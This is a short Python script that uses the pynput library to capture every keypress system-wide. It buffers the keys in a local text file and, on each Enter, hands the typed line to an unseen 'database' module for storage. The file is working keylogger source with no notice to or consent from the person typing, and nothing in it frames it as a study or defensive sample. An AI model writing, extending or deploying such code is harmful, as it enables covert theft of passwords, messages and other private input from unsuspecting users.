from pynput import keyboard
import database
import os

collection = database.database_init()

def on_press(key, collection = collection):
    messagelog(key, collection)

def messagelog(key, collection):
    try:
        f = open('keyFile.txt', 'a')
    except IOError:
        print("Unknown IO Exception occurred!")
        raise IOError

    try:
        f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            f.close()
            f = open('keyFile.txt', 'r')
            database.message_format(f.readline(), collection)
            f.close()
            f = open('keyFile.txt', 'w')
            f.write('')
        elif key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.backspace:
            with open('keyFile.txt', 'rb+') as filehandle:
                try:
                    filehandle.seek(-1, os.SEEK_END)
                    filehandle.truncate()
                except Exception:
                    pass
        else:
            pass

    f.close()

def main():
    # Collect events until released
    listener =  keyboard.Listener(on_press = on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()